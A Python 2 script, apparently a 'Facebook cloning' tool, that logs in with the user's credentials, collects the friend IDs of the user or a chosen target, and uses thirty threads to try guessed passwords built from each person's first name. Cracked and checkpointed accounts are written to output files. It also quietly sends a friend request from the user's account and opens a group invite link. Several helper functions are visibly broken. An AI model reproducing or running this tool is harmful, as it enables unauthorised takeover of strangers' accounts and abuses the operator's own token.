#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Sachin Shrivastv
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def exit():
	print "\x1b[1;99mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def typing(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.04)
		
def typing1(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.008)
		
def typing2(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

##### LOGO #####
#Bannering Start#
logO='                    \033[1;97m------------------------------  '
logo='                  |   \033[1;93m_____         _______        \033[1;97m| '
logo1='                  |  \033[1;93m/ ____|       |__   __|       \033[1;97m| '  
logo2='                  |  \033[1;93m| (__     __ _   | |  __   __ \033[1;97m| '
logo3='                  |  \033[1;93m\___ \   / _` |  | |  \ \ / / \033[1;97m| '
logo4='                  |  \033[1;93m____) | | (_| |  | |   \ V /  \033[1;97m| '
logo5='                  | \033[1;93m|_____/   \__,_|  |_|    \_/   \033[1;97m| '
logo6='                  |________________________________| '
logo7=('        }~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{')
logo8=('}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{')
def bannering():
	print(logO)
	time.sleep(0.1)
	print(logo)
	time.sleep(0.1)
	print(logo1)
	time.sleep(0.1)
	print(logo2)
	time.sleep(0.1)
	print(logo3)
	time.sleep(0.1)
	print(logo4)
	time.sleep(0.1)
	print(logo5)
	time.sleep(0.1)
	print(logo6)
	time.sleep(0.1)
	print(logo7)
	time.sleep(0.1)
	print(logo8)                

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93m Please Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
def register():
	os.system('clear')
	try:
		data = open('data.txt','r')
		login() 
	except (KeyError,IOError):
		bannering()
		serial = raw_input('Enter Serial Keys:- ').upper()
		if serial =='':
			time.sleep(1)
			print('\033[1;91mWrong Serial keys. \n\033[1;93mPlease Contact Devploer For Serial Keys\033[1;97m')
			raw_input('Press Enter to Continue...')
			exit()
		elif serial =='GER8-5FRS-URTG-HT0K' or serial =='GER85FRSURTGHT0K':
			time.sleep(1)
			print('\033[1;93mCongratulations \033[1;97mTool activated Sucessful')
			time.sleep(1)
			data = open('data.txt','w')
			data.write('Sucessfully Activated Tool With Licence key\n This Licence key Proved from Devloper\n\nOwner:~ Badhshah\nAuthor:~ SaTv\n')
			data.close()
			login()
		else:
			time.sleep(1)
			print('\033[1;91mWrong Serial keys. \n\033[1;93mPlease Contact Devploer For Serial Keys\033[1;97m')
			raw_input('Press Enter to Continue...')
			exit()       
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print(logO)
		time.sleep(0.1)
		print(logo)
		time.sleep(0.1)
		print(logo1)
		time.sleep(0.1)
		print(logo2)
		time.sleep(0.1)
		print(logo3)
		time.sleep(0.1)
		print(logo4)
		time.sleep(0.1)
		print(logo5)
		time.sleep(0.1)
		print(logo6)
		time.sleep(0.1)
		print(logo7)
		time.sleep(0.1)
		print('                        \033[1;93mLoging with Facebook\033[1;97m')
		print(logo8)
		id = raw_input(' \033[1;93mEmail id:- \033[1;97m')
		pwd = raw_input(' \033[1;93mPassword:- \033[1;97m')
		print(logo8)
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91mThere is no internet connection"
			exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n \033[1;97mLogin Successful...'
				os.system('xdg-open https://chat.whatsapp.com/JJOVjf9DdsA9o4FeXVol6W ') #Whatsapp Group invite
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91mThere is no internet connection"
				exit()
		if 'checkpoint' in url:
			print("\n\033[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
		else:
			print("\n \033[1;97mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91mThere is no internet connection"
		exit()
	os.system("clear") #Main #Menu
	bannering()
	print'                         \033[1;97mID:~ \033[1;93m'+id+'\033[1;97m '
	print'                         \033[1;97mName:~ \033[1;93m'+nama+'\033[1;97m '
	print(logo8)
	print('{1}~~~~~>> Start Cloning')
	print('{2}~~~~~>> Contact us')
	print('{3}~~~~~>> logout')
	print('{0}~~~~~>> Exit')
	pilih()


def pilih():
	unikers = raw_input('Select Option:~ ')
	if unikers =="":
		menu()
	elif unikers =="1":
		cloning()
	elif unikers =="2":
		contact()
	elif unikers =="3":
		print('\033[1;97mLogout Sucessfull')
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()		
	elif unikers =="0":
		time.sleep(1)
		exit()	
	else:
		print('\033[1;93mWrong Input')
		time.sleep(1)
		menu()

def contact():
	os.system('clear')
	bannering()
	print("                         ,     \    /      ,")
	time.sleep(0.1)
	print('''                        / \    )\__/(     / \'''')
	time.sleep(0.1)
	print('''                       /   \  (_\  /_)   /   \'''')
	time.sleep(0.1)
	print('   <__________________/_____\__\@  @/___/_____\_________________>')
	time.sleep(0.1)
	print('    |                          |\../|                          |')
	time.sleep(0.1)
	print('    |                           \VV/                           |')
	time.sleep(0.1)
	print('    |                    \033[1;93mLocation:~ Nepal\033[1;97m                      |')
	time.sleep(0.1)
	print('    |                    \033[1;93mOwner:~  Badhshah\033[1;97m                     |')	
	time.sleep(0.1)
	print('    |                 \033[1;93mAuthor:~ Sachin Shrivastv\033[1;97m                |')
	time.sleep(0.1)
	print('    |                    \033[1;93mAuthor:~ Monu Raja\033[1;97m                    |')	
	time.sleep(0.1)
	print('    |                 \033[1;93mAuthor:~ Sushant Shrivastv\033[1;97m               |')
	time.sleep(0.1)
	print('    |                 \033[1;93mAscli art by:~ Brian Young\033[1;97m               |')
	time.sleep(0.1)
	print('    |__________________________________________________________|')
	time.sleep(0.1)
	print('''                  |    /\ /      \\\        \ /\    |''')
	time.sleep(0.1)
	print('                  |  /   V        ))        V   \  |')
	time.sleep(0.1)
	print('                  |/     `       //         `     \|')
	time.sleep(0.1)
	print('''                  `              V''')
	print(logo8)
	raw_input(' Press Enter To Back...')
	menu()
	
def cloning():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;93mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	bannering()
	print('\033[1;93m{1}~~~~~>> Friend Cloning')
	print('{2}~~~~~>> Target Cloning')
	print('{0}~~~~~>> Back')
	pilih_super()

def pilih_super():
	peak = raw_input('\033[1;97mSelect Option:~ ')
	if peak =="":
		cloning()
	elif peak =="1":
		os.system('clear')
		bannering()
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		bannering()
		idt = raw_input(' Enter Target ID:- ')
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print" \033[1;93mName\033[1;93m:-\033[1;97m "+op["name"]
		except KeyError:
			print" \033[1;91mID Not Found!"
			raw_input(" \n\033[1;97mPress Enter To Back...")
			cloning()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		os.system('clear')
		menu()
	else:
		print('\033[1;93mWrong Input')
		time.sleep(1)
		cloning()
	print " \033[1;93mTotal IDs:- \033[1;97m"+str(len(id))
	print('        \033[1;97m>>>>>>>~~~~~~~~~~{\033[1;93mCloning Start\033[1;97m}~~~~~~~~~~<<<<<<<<')
	print(logo8)
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('Out')
		except OSError:
			pass #Sachin Shrivastv
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'@123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print ' \033[1;93m{Successful}\033[1;93m ' + user + ' \033[1;93m>-----<\033[1;93m ' + pass1
				oks = open("Out/Successful.txt", "a")
				oks.write("[Successful] "+user+"|"+pass1+"\n")
				oks.close()
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print ' \033[1;91m{CheckPoint}\033[1;91m ' + user + ' \033[1;91m>-----<\033[1;91m ' + pass1
					cek = open("Out/Checkpoint.txt", "a")
					cek.write("[Checkpoint] "+user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print ' \033[1;93m{Successful}\033[1;93m ' + user + ' \033[1;93m>-----<\033[1;93m ' + pass2
						oks = open("Out/Successful.txt", "a")
						oks.write("[Successful] "+user+"|"+pass2+"\n")
						oks.close()
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print ' \033[1;91m{CheckPoint}\033[1;91m ' + user + ' \033[1;91m>-----<\033[1;91m ' + pass2
							cek = open("Out/Checkpoint.txt", "a")
							cek.write("[Checkpoint] "+user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)

														
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print(logo8)
	print('        \033[1;97m>>>>>>>~~~~~~~~~~~{\033[1;93mCloning End\033[1;97m}~~~~~~~~~~~<<<<<<<<')
	print(logo8)
	print(' Total Idz Saved: Out/Sucessful.txt')
	raw_input(" \033[1;93mPress Enter To Back...")
	menu()								
	
if __name__ == '__main__':
	register()
